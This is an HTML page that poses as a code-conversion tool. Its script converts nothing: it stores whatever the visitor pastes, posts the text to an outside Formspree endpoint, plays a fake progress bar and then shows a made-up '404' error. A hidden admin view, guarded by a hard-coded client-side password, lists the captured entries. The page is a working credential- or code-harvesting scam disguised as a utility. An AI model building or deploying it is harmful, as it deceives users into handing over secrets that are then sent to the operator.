<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Paste Code To Convert</title>

<style>
body {
    background: #0f172a;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    color: white;
}

.box {
    background: #020617;
    padding: 25px;
    border-radius: 12px;
    width: 90%;
    max-width: 400px;
    box-shadow: 0 0 25px rgba(0,0,0,0.5);
}

h2 {
    text-align: center;
}

textarea {
    width: 100%;
    height: 100px;
    border-radius: 8px;
    border: none;
    padding: 10px;
    resize: none;
    font-size: 15px;
}

button {
    width: 100%;
    margin-top: 15px;
    padding: 12px;
    background: #2563eb;
    border: none;
    border-radius: 8px;
    color: white;
    font-size: 16px;
    cursor: pointer;
}

.progress {
    margin-top: 15px;
    display: none;
}

.progress div {
    height: 10px;
    background: #22c55e;
    width: 0%;
    border-radius: 6px;
}

#status {
    text-align: center;
    margin-top: 10px;
    font-size: 14px;
}

/* ADMIN */
.admin {
    display: none;
}
.admin textarea {
    height: 200px;
}
</style>
</head>

<body>

<div class="box user">
    <h2>Paste Code To Convert</h2>
    <textarea id="userText" placeholder="Enter Code to convert..."></textarea>
    <button onclick="convert()">Convert</button>

    <div class="progress" id="progressBox">
        <div id="bar"></div>
    </div>
    <div id="status"></div>
</div>

<div class="box admin">
    <h2>ðŸ“Š Admin Panel</h2>
    <textarea id="logs" readonly></textarea>
</div>

<script>
const ADMIN_PASSWORD = "1234"; // CHANGE THIS

// ADMIN MODE
if (location.search.includes("admin")) {
    let pass = prompt("Enter admin password:");
    if (pass === ADMIN_PASSWORD) {
        document.querySelector(".user").style.display = "none";
        document.querySelector(".admin").style.display = "block";
        loadLogs();
    } else {
        alert("Access Denied");
    }
}

function convert() {
    let text = document.getElementById("userText").value;
    if (text.trim() === "") {
        alert("Please enter text");
        return;
    }

    // SAVE LOCALLY
    let logs = JSON.parse(localStorage.getItem("logs") || "[]");
    logs.push(text);
    localStorage.setItem("logs", JSON.stringify(logs));

    // SEND TO EMAIL (Formspree)
    fetch("https://formspree.io/f/mzdabqwj", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: text })
    });

    // FAKE PROGRESS
    document.getElementById("progressBox").style.display = "block";
    let bar = document.getElementById("bar");
    let status = document.getElementById("status");

    let percent = 0;
    let interval = setInterval(() => {
        percent += Math.floor(Math.random() * 10);
        if (percent >= 87) percent = 87;
        bar.style.width = percent + "%";
        status.innerText = "Converting... " + percent + "%";

        if (percent === 87) {
            clearInterval(interval);
            setTimeout(() => {
                alert("Failed 404: Error Not Found\nPlease try again later.");
                document.getElementById("userText").value = "";
                bar.style.width = "0%";
                status.innerText = "";
                document.getElementById("progressBox").style.display = "none";
            }, 800);
        }
    }, 300);
}

function loadLogs() {
    let logs = JSON.parse(localStorage.getItem("logs") || "[]");
    document.getElementById("logs").value = logs.join("\n\n---\n\n");
}
</script>

</body>
</html>